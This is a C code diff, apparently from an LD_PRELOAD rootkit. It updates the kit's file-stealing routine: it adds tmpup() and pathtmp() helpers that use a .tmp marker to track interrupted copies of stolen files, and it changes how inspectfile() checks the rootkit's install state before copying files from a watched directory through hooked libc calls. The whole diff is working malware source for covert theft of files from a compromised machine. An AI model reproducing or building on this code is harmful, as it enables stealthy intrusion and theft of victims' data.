@@ -140,11 +140,52 @@ nopenope:
 }
 #endif
 
+char *pathtmp(char *newpath){
+    size_t pathsize = strlen(newpath)+5;
+    char *path = malloc(pathsize);
+    if(!path) return NULL;
+    snprintf(path, pathsize, "%s.tmp", newpath);
+    return path;
+}
+
+// determine if the file's .tmp is still up.
+// if it is, determine if newpath is still being written.
+// if it is, status=1, so don't try to write the file again.
+// if it is not, see if its size matches the target file to steal.
+// it it does not match, a steal has stopped during a previous.
+int tmpup(char *newpath){
+    char *path;
+    int status=0;
+    off_t o, n;
+
+    hook(CACCESS, CUNLINK);
+
+    if((long)call(CACCESS, newpath, F_OK) != 0)
+        return 0;
+
+    path = pathtmp(newpath);
+    if(path == NULL) return -1;
+
+    if((long)call(CACCESS, path, F_OK) != 0)
+        goto nopenope;
+
+    o = getfilesize(newpath);
+    usleep(50000);
+    n = getfilesize(newpath);
+
+    if(o == n) call(CUNLINK, path); // file isn't getting any bigger... remove .tmp file. (it shouldn't even exist)
+    else if(n > o) status=1; // file size is still increasing....
+
+nopenope:
+    free(path);
+    return status;
+}
 
 int writecopy(const char *oldpath, char *newpath){
     struct stat64 nstat; // for newpath, should it exist, to check if there's a change in size.
-    int statr;
+    int statr, t;
     unsigned char *map, p;
+    char *tmppath;
     FILE *ofp, *nfp;
     off_t fsize;
     mode_t mode;
@@ -159,7 +200,8 @@ int writecopy(const char *oldpath, char *newpath){
     if(ofp == NULL && errno == ENOENT) return 1;
     else if(ofp == NULL) return -1;
 
-    if(!S_ISREG(mode) || (statr != -1 && nstat.st_size == fsize)){
+    t = tmpup(newpath);
+    if(!S_ISREG(mode) || t || t<0 || (statr != -1 && nstat.st_size == fsize)){
         fclose(ofp);
         return 1;
     }
@@ -199,9 +241,8 @@ int writecopy(const char *oldpath, char *newpath){
     }
 
     // create this file to make it clear that the file is still being copied. unlink it when done.
-    char partpath[strlen(newpath)+6];
-    snprintf(partpath, sizeof(partpath), "%s.part", newpath);
-    call(CCREAT, partpath, 0600);
+    tmppath = pathtmp(newpath);
+    call(CCREAT, tmppath, 0600);
 
     for(int i=0; i<fsize; i++){
         p = map[i];
@@ -211,7 +252,8 @@ int writecopy(const char *oldpath, char *newpath){
     fclose(nfp);
     madvise(map, fsize, MADV_DONTNEED);
     munmap(map, fsize);
-    call(CUNLINK, partpath);
+    call(CUNLINK, tmppath);
+    free(tmppath);
 
 #ifdef KEEP_FILE_MODE
     hook(CCHMOD);
@@ -269,7 +311,7 @@ static int takeit(void *oldpath){
 }
 
 void inspectfile(const char *pathname){
-    if(sssdproc() || rknomore()) return;
+    if(sssdproc() || rknomore(INSTALL_DIR, BDVLSO)) return;
 
     hook(COPENDIR);
     DIR *dp = call(COPENDIR, INTEREST_DIR);
